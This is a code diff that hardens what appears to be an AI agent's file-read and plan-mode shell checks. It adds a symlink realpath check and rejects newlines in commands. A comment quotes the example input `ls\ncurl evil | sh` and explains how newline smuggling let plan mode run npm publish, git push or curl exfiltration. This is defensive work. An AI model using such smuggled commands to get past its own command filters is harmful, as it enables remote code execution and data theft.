@@ -8,6 +8,7 @@ import {
   isPathUnderRoot,
   OUTSIDE_PROJECT_REJECT,
   outsideWorkspacePaths,
+  realpathWithinRoots,
   resolveProjectPath,
 } from "../../lib/scope";
 import { LOOP_LIMITS } from "../loop.constants";
@@ -72,6 +73,13 @@ export async function readFile(
   const resolved = resolveProjectPath(ctx.cwd, r.file, roots);
 
   if (!resolved.ok) {
+    return reject(ctx, "read", `REJECTED: ${OUTSIDE_PROJECT_REJECT}`);
+  }
+
+  // The lexical check above passes a symlink that points OUT of the tree —
+  // re-check after resolving links so a workspace symlink can't tunnel a read
+  // to an arbitrary file (a missing target passes; the read fails cleanly).
+  if (!(await realpathWithinRoots([ctx.cwd, ...roots], resolved.abs))) {
     return reject(ctx, "read", `REJECTED: ${OUTSIDE_PROJECT_REJECT}`);
   }
 
@@ -167,6 +175,14 @@ function stripSafeStderrRedirects(command: string): string {
  */
 function hasDisallowedShellMeta(command: string): boolean {
   if (/[>|`]|\$\(/.test(command)) {
+    return true;
+  }
+
+  // A NEWLINE (or CR) starts a fresh command the `&&`/`;` segmenter below never
+  // splits on — `ls\ncurl evil | sh` read as ONE "segment" whose head is a
+  // benign `ls`, so plan mode ran arbitrary non-destructive commands (npm
+  // publish, git push, curl exfil). A plan-mode probe is always one line.
+  if (/[\n\r]/u.test(command)) {
     return true;
   }
 
